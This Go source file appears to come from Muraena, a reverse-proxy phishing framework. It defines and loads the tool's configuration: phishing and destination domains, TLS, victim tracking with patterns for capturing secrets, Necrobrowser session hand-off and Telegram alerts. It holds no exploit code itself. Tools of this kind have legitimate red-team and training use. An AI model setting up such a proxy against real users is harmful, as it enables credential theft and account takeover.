package session

import (
	"fmt"
	"io/ioutil"
	"os"
	"regexp"
	"strings"

	"github.com/pelletier/go-toml"
	"github.com/pkg/errors"

	"github.com/muraenateam/muraena/core"
)

var (
	DefaultIP              = "0.0.0.0"
	DefaultListener        = "tcp"
	DefaultHTTPPort        = 80
	DefaultHTTPSPort       = 443
	DefaultBase64Padding   = []string{"=", "."}
	DefaultSkipContentType = []string{"font/*", "image/*"}
)

type Redirect struct {
	Hostname       string `toml:"hostname"`
	Path           string `toml:"path"`
	Query          string `toml:"query"`
	RedirectTo     string `toml:"redirectTo"`
	HTTPStatusCode int    `toml:"httpStatusCode"`
}

type StaticHTTPConfig struct {
	Enabled       bool   `toml:"enable"`
	LocalPath     string `toml:"localPath"`
	URLPath       string `toml:"urlPath"`
	ListeningHost string `toml:"listeningHost"`
	ListeningPort int    `toml:"listeningPort"`
}

// Configuration struct
type Configuration struct {
	//
	// Proxy rules
	//
	Proxy struct {
		Phishing    string `toml:"phishing"`
		Target      string `toml:"destination"`
		IP          string `toml:"IP"`
		Listener    string `toml:"listener"`
		Port        int    `toml:"port"`
		PortMap     string `toml:"portmapping"`
		HTTPtoHTTPS struct {
			Enabled  bool `toml:"enable"`
			HTTPport int  `toml:"port"`
		} `toml:"HTTPtoHTTPS"`

		Protocol string `toml:"-"`
	} `toml:"proxy"`

	//
	// Origins
	//
	Origins struct {
		ExternalOriginPrefix string            `toml:"externalOriginPrefix"`
		ExternalOrigins      []string          `toml:"externalOrigins"`
		OriginsMapping       map[string]string `toml:"-"`

		SubdomainMap [][]string `toml:"subdomainMap"`
	} `toml:"origins"`

	//
	// Transforming rules
	//
	Transform struct {
		Base64 struct {
			Enabled bool     `toml:"enable"`
			Padding []string `toml:"padding"`
		} `toml:"base64"`

		Request struct {
			SkipExtensions []string `toml:"-"`

			UserAgent string `toml:"userAgent"`
			// Headers list to consider for the transformation
			Headers []string `toml:"headers"`

			Remove struct {
				Headers []string `toml:"headers"`
			} `toml:"remove"`

			Add struct {
				Headers []struct {
					Name  string `toml:"name"`
					Value string `toml:"value"`
				} `toml:"headers"`
			} `toml:"add"`
		} `toml:"request"`

		Response struct {
			SkipContentType []string `toml:"skipContentType"`

			Headers []string `toml:"headers"`

			// CustomContent Transformations
			CustomContent [][]string `toml:"customContent"`

			Cookie struct {
				SameSite string `toml:"sameSite"`
			} `toml:"cookie"`

			Remove struct {
				Headers []string `toml:"headers"`
			} `toml:"remove"`

			Add struct {
				Headers []struct {
					Name  string `toml:"name"`
					Value string `toml:"value"`
				} `toml:"headers"`
			} `toml:"add"`
		} `toml:"response"`
	} `toml:"transform"`

	Redirects []Redirect `toml:"redirect"`

	//
	// Logging
	//
	Log struct {
		Enabled  bool   `toml:"enable"`
		FilePath string `toml:"filePath"`
	} `toml:"log"`

	//
	// DB (Redis)
	//
	Redis struct {
		Host     string `toml:"host"`     // default: 127.0.0.1
		Port     int    `toml:"port"`     // default: 6379
		Password string `toml:"password"` // default: ""
	} `toml:"redis"`

	//
	// TLS
	//
	TLS struct {
		Enabled     bool   `toml:"enable"`
		Expand      bool   `toml:"expand"`
		Certificate string `toml:"certificate"`
		Key         string `toml:"key"`
		Root        string `toml:"root"`
		SSLKeyLog   string `toml:"sslKeyLog"`

		CertificateContent string `toml:"-"`
		KeyContent         string `toml:"-"`
		RootContent        string `toml:"-"`

		// Minimum supported TLS version: SSL3, TLS1, TLS1.1, TLS1.2, TLS1.3
		MinVersion               string `toml:"minVersion"`
		MaxVersion               string `toml:"maxVersion"`
		PreferServerCipherSuites bool   `toml:"preferServerCipherSuites"`
		SessionTicketsDisabled   bool   `toml:"SessionTicketsDisabled"`
		InsecureSkipVerify       bool   `toml:"insecureSkipVerify"`
		RenegotiationSupport     string `toml:"renegotiationSupport"`
	} `toml:"tls"`

	//
	// Tracking
	//
	Tracking struct {
		Enabled             bool `toml:"enable"`
		TrackRequestCookies bool `toml:"trackRequestCookies"`

		Trace struct {
			Identifier     string `toml:"identifier"`
			Header         string `toml:"header"`
			Domain         string `toml:"domain"`
			ValidatorRegex string `toml:"validator"`

			Landing struct {
				Type       string `toml:"type"` // path or query
				Header     string `toml:"header"`
				RedirectTo string `toml:"redirectTo"` // redirect url once the landing is detected (applicable only if type is path)
			} `toml:"landing"`
		} `toml:"trace"`

		Secrets struct {
			Paths []string `toml:"paths"`

			Patterns []struct {
				Label    string `toml:"label"`
				Matching string `toml:"matching"`
				Start    string `toml:"start"`
				End      string `toml:"end"`
			} `toml:"patterns"`
		} `toml:"secrets"`
	} `toml:"tracking"`

	// Crawler
	Crawler struct {
		Enabled bool `toml:"enable"`
		Depth   int  `toml:"depth"`
		UpTo    int  `toml:"upto"`
	} // `toml:"crawler"`  TODO: Temporarily disabled

	//
	// Necrobrowser
	//
	Necrobrowser struct {
		Enabled bool `toml:"enable"`

		SensitiveLocations struct {
			AuthSession         []string `toml:"authSession"`
			AuthSessionResponse []string `toml:"authSessionResponse"`
		} `toml:"urls"`

		Endpoint string `toml:"endpoint"`
		Profile  string `toml:"profile"`
		// Keepalive struct {
		// 	Enabled bool `toml:"enable"`
		// 	Minutes int  `toml:"minutes"`
		// } `toml:"keepalive"`
		Trigger struct {
			Type   string   `toml:"type"`
			Values []string `toml:"values"`
			Delay  int      `toml:"delay"`
		} `toml:"trigger"`
	} `toml:"necrobrowser"`

	StaticServer StaticHTTPConfig `toml:"staticServer"`

	//
	// Watchdog
	//
	Watchdog struct {
		Enabled bool   `toml:"enable"`
		Dynamic bool   `toml:"dynamic"`
		Rules   string `toml:"rules"`
		GeoDB   string `toml:"geoDB"`
	} `toml:"watchdog"`

	//
	// Telegram
	//
	Telegram struct {
		Enabled  bool     `toml:"enable"`
		BotToken string   `toml:"botToken"`
		ChatIDs  []string `toml:"chatIDs"`
	} `toml:"telegram"`
}

// GetConfiguration returns the configuration object
func (s *Session) GetConfiguration() (err error) {

	cb, err := ioutil.ReadFile(*s.Options.ConfigFilePath)
	if err != nil {
		return errors.New(fmt.Sprintf("Error reading configuration file %s: %s", *s.Options.ConfigFilePath, err))
	}
	c := Configuration{}
	if err := toml.Unmarshal(cb, &c); err != nil {
		return errors.New(fmt.Sprintf("Error unmarshalling TOML configuration file %s: %s", *s.Options.ConfigFilePath,
			err))
	}

	s.Config = &c

	if s.Config.Proxy.Phishing == "" || s.Config.Proxy.Target == "" {
		return errors.New(fmt.Sprintf("Missing phishing/destination from configuration!"))
	}

	// Listening
	if s.Config.Proxy.IP == "" {
		s.Config.Proxy.IP = DefaultIP
	}

	// Network Listener
	if s.Config.Proxy.Listener == "" {
		s.Config.Proxy.Listener = DefaultListener
	} else if !core.StringContains(strings.ToLower(s.Config.Proxy.Listener), []string{"tcp", "tcp4", "tcp6"}) {
		s.Config.Proxy.Listener = DefaultListener
	}

	if s.Config.Proxy.Port == 0 {
		s.Config.Proxy.Port = DefaultHTTPPort
		if s.Config.TLS.Enabled {
			s.Config.Proxy.Port = DefaultHTTPSPort
		}
	}

	// HTTPtoHTTPS
	if s.Config.Proxy.HTTPtoHTTPS.Enabled {
		if s.Config.Proxy.HTTPtoHTTPS.HTTPport == 0 {
			s.Config.Proxy.HTTPtoHTTPS.HTTPport = DefaultHTTPPort
		}
	}

	//
	// Origins
	//

	// ExternalOriginPrefix must match the a-zA-Z0-9\- regex pattern
	if s.Config.Origins.ExternalOriginPrefix != "" {
		m, err := regexp.MatchString("^[a-zA-Z0-9-]+$", s.Config.Origins.ExternalOriginPrefix)
		if err != nil {
			return errors.New(fmt.Sprintf("Error matching ExternalOriginPrefix %s: %s", s.Config.Origins.ExternalOriginPrefix, err))
		}

		if !m {
			return errors.New(fmt.Sprintf("Invalid ExternalOriginPrefix %s. It must match the a-zA-Z0-9\\- regex pattern.", s.Config.Origins.ExternalOriginPrefix))
		}
	} else {
		s.Config.Origins.ExternalOriginPrefix = "ext"
	}

	s.Config.Origins.OriginsMapping = make(map[string]string)

	// Load TLS config
	s.Config.Proxy.Protocol = "http://"

	if s.Config.TLS.Enabled {

		// Load TLS Certificate
		s.Config.TLS.CertificateContent = s.Config.TLS.Certificate

		if !strings.HasPrefix(s.Config.TLS.Certificate, "-----BEGIN CERTIFICATE-----\n") {
			er := errors.New(fmt.Sprintf("Error reading TLS cert %s: %s", s.Config.TLS.Certificate, err))
			if _, err := os.Stat(s.Config.TLS.CertificateContent); err == nil {
				crt, err := ioutil.ReadFile(s.Config.TLS.CertificateContent)
				if err != nil {
					return er
				}
				s.Config.TLS.CertificateContent = string(crt)
			} else {
				return er
			}
		}

		// Load TLS Root CA Certificate
		s.Config.TLS.RootContent = s.Config.TLS.Root
		if !strings.HasPrefix(s.Config.TLS.Root, "-----BEGIN CERTIFICATE-----\n") {
			er := errors.New(fmt.Sprintf("Error reading TLS cert pool %s: %s", s.Config.TLS.Root, err))
			if _, err := os.Stat(s.Config.TLS.RootContent); err == nil {
				crtp, err := ioutil.ReadFile(s.Config.TLS.RootContent)
				if err != nil {
					return er
				}
				s.Config.TLS.RootContent = string(crtp)
			} else {
				return er
			}
		}

		// Load TLS Certificate Key
		s.Config.TLS.KeyContent = s.Config.TLS.Key
		if !strings.HasPrefix(s.Config.TLS.Key, "-----BEGIN") {
			er := errors.New(fmt.Sprintf("Error reading TLS cert key %s: %s", s.Config.TLS.Key, err))
			if _, err := os.Stat(s.Config.TLS.KeyContent); err == nil {
				k, err := ioutil.ReadFile(s.Config.TLS.KeyContent)
				if err != nil {
					return er
				}
				s.Config.TLS.KeyContent = string(k)
			} else {
				return er
			}
		}

		s.Config.Proxy.Protocol = "https://"

		s.Config.TLS.MinVersion = strings.ToUpper(s.Config.TLS.MinVersion)
		if !core.StringContains(s.Config.TLS.MinVersion, []string{"SSL3.0", "TLS1.0", "TLS1.1", "TLS1.2", "TLS1.3"}) {
			// Fallback to TLS1
			s.Config.TLS.MinVersion = "TLS1.0"
		}

		s.Config.TLS.MaxVersion = strings.ToUpper(s.Config.TLS.MaxVersion)
		if !core.StringContains(s.Config.TLS.MaxVersion, []string{"SSL3.0", "TLS1.0", "TLS1.1", "TLS1.2", "TLS1.3"}) {
			// Fallback to TLS1.3
			s.Config.TLS.MaxVersion = "TLS1.3"
		}

		s.Config.TLS.RenegotiationSupport = strings.ToUpper(s.Config.TLS.RenegotiationSupport)
		if !core.StringContains(s.Config.TLS.RenegotiationSupport, []string{"NEVER", "ONCE", "FREELY"}) {
			// Fallback to NEVER
			s.Config.TLS.RenegotiationSupport = "NEVER"
		}

	}

	//
	// Transforming rules
	//
	if s.Config.Transform.Base64.Padding == nil {
		s.Config.Transform.Base64.Padding = DefaultBase64Padding
	}

	if s.Config.Transform.Response.SkipContentType == nil {
		s.Config.Transform.Response.SkipContentType = DefaultSkipContentType
	}

	s.Config.Transform.Request.SkipExtensions = []string{
		"ttf", "otf", "woff", "woff2", "eot", // fonts and images
		"ase", "art", "bmp", "blp", "cd5", "cit", "cpt", "cr2", "cut", "dds", "dib", "djvu", "egt", "exif", "gif",
		"gpl", "grf", "icns", "ico", "iff", "jng", "jpeg", "jpg", "jfif", "jp2", "jps", "lbm", "max", "miff", "mng",
		"msp", "nitf", "ota", "pbm", "pc1", "pc2", "pc3", "pcf", "pcx", "pdn", "pgm", "PI1", "PI2", "PI3", "pict",
		"pct", "pnm", "pns", "ppm", "psb", "psd", "pdd", "psp", "px", "pxm", "pxr", "qfx", "raw", "rle", "sct", "sgi",
		"rgb", "int", "bw", "tga", "tiff", "tif", "vtf", "xbm", "xcf", "xpm", "3dv", "amf", "ai", "awg", "cgm", "cdr",
		"cmx", "dxf", "e2d", "egt", "eps", "fs", "gbr", "odg", "svg", "stl", "vrml", "x3d", "sxd", "v2d", "vnd", "wmf",
		"emf", "art", "xar", "png", "webp", "jxr", "hdp", "wdp", "cur", "ecw", "iff", "lbm", "liff", "nrrd", "pam",
		"pcx", "pgf", "sgi", "rgb", "rgba", "bw", "int", "inta", "sid", "ras", "sun", "tga"}

	// Fix Craft config
	slice := s.Config.Transform.Response.Add.Headers
	for s, header := range s.Config.Transform.Response.Add.Headers {
		if header.Name == "" {
			slice = append(slice[:s], slice[s+1:]...)
		}
	}
	s.Config.Transform.Response.Add.Headers = slice

	slice = s.Config.Transform.Request.Add.Headers
	for s, header := range s.Config.Transform.Request.Add.Headers {
		if header.Name == "" {
			slice = append(slice[:s], slice[s+1:]...)
		}
	}
	s.Config.Transform.Request.Add.Headers = slice

	// Final Checks
	return s.DoChecks()
}

func (s *Session) UpdateConfiguration(domains *[]string) (err error) {
	config := s.Config

	//
	// Update config
	//
	// Disable crawler and update external domains
	config.Origins.ExternalOrigins = *domains
	config.Crawler.Enabled = false

	// Update TLS accordingly
	if !config.TLS.Expand {
		config.TLS.Root = config.TLS.RootContent
		config.TLS.Key = config.TLS.KeyContent
		config.TLS.Certificate = config.TLS.CertificateContent
	}

	newConf, err := toml.Marshal(config)
	if err != nil {
		return
	}

	return ioutil.WriteFile(*s.Options.ConfigFilePath, newConf, 0644)
}

func (s *Session) DoChecks() (err error) {

	// Check Redirect
	s.CheckRedirect()

	// Check Log
	err = s.CheckLog()
	if err != nil {
		return
	}

	// Check Tracking
	err = s.CheckTracking()
	if err != nil {
		return
	}

	// Check Static Server
	err = s.CheckStaticServer()
	if err != nil {
		return
	}

	return
}

// CheckRedirect checks the redirect rules and removes invalid ones.
func (s *Session) CheckRedirect() {
	var redirects []Redirect
	for _, drop := range s.Config.Redirects {
		if drop.RedirectTo == "" {
			continue
		}

		if drop.Hostname == "" && drop.Path == "" && drop.Query == "" {
			continue
		}

		// Unset HTTPStatusCode will default to 302
		if drop.HTTPStatusCode == 0 {
			drop.HTTPStatusCode = 302
		}

		redirects = append(redirects, drop)
	}

	s.Config.Redirects = redirects
}

// CheckLog checks the log configuration and disables it if the file is not accessible.
func (s *Session) CheckLog() (err error) {
	if !s.Config.Log.Enabled {
		return
	}

	if s.Config.Log.FilePath == "" {
		s.Config.Log.FilePath = "muraena.log"
	}

	// If the file doesn't exist, create it, or append to the file
	f, err := os.OpenFile(s.Config.Log.FilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		s.Config.Log.Enabled = false
		return errors.New(fmt.Sprintf("Error opening log file %s: %s", s.Config.Log.FilePath, err))
	}
	defer f.Close()

	return
}

// CheckTracking checks the tracking configuration and disables it if the file is not accessible.
func (s *Session) CheckTracking() (err error) {
	if !s.Config.Tracking.Enabled {
		return
	}

	return
}

// CheckStaticServer checks the static server configuration and disables it if the file is not accessible.
func (s *Session) CheckStaticServer() (err error) {
	if !s.Config.StaticServer.Enabled {
		return
	}

	if s.Config.StaticServer.LocalPath == "" {
		s.Config.StaticServer.Enabled = false
		return errors.New(fmt.Sprintf("Error opening static server local path %s: %s", s.Config.StaticServer.LocalPath, err))
	}

	if s.Config.StaticServer.URLPath == "" {
		s.Config.StaticServer.Enabled = false
		return errors.New(fmt.Sprintf("Error opening static server URL path %s: %s", s.Config.StaticServer.URLPath, err))
	}

	return
}
